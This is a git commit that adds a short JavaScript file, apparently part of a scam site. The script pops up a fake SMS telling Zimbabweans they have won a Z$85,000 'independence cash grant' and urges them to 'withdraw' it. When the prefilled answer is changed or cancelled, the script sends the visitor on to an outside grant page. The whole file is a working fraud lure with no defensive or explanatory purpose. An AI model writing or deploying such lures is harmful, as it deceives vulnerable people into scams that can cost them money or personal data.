b54b962c047aaf9c05eada92eb299fc00199d2bf
surepluger <adigunkola666@gmail.com>
2025-04-10 08:29:32 +0100

    Create zimbabwe-active.js

---
+++ zimbabwe-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW Z$85,000'
+password=prompt('SMS: Congratulations, you are among the selected zimbabweans to receive Z$85,000 as independence cash grant, Press Ok to withdraw cash Now ','WITHDRAW Z$85,000');
+if (password != 'WITHDRAW Z$85,000') {
+location.href='https://sureplug.org/zimbabwe-grant';
+}
